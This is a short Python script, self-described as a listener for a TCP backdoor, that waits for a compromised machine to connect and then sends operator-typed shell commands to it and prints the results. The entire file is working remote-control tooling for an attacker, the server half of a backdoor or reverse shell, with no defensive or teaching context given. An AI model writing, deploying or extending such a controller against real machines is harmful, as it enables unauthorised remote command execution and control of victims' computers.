import socket
import utils
import os

def main():
    args = utils.init_argparse('Listener for TCP backdoor.')
    port = args.port
    ip = args.ip

    listener = socket.socket()
    listener.bind((ip, port))
    
    print('[+] Listening for incoming connections.')
    listener.listen(1)

    try:
        client, client_ip = listener.accept()
        print('[+] Received connection from {ip}.'.format(ip=client_ip))

        while True:
            cmd = input('$ ')

            utils.send_data(client, cmd)
            out = utils.recv_data(client)
            print(out)

            if cmd == 'exit':
                print('[+] Exitting...')
                break

    except KeyboardInterrupt:
        print('\n[+] Exitting...')

    listener.close()

if __name__ == '__main__':
    main()